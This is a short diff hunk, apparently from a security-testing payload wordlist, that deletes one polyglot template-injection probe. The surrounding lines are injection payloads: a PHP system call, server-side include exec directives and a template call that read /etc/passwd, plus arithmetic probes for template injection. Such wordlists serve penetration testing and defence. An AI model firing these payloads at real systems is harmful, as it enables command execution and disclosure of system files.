@@ -17,7 +17,6 @@ system('cat /etc/passwd');
 &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
 {{ get_user_file("/etc/passwd") }}
 <!--#exec cmd="/bin/cat /etc/passwd"-->
-${{<%[%'"}}%\.
 @(7777*7777)
 ${7777*7777}
 #{7777*7777}
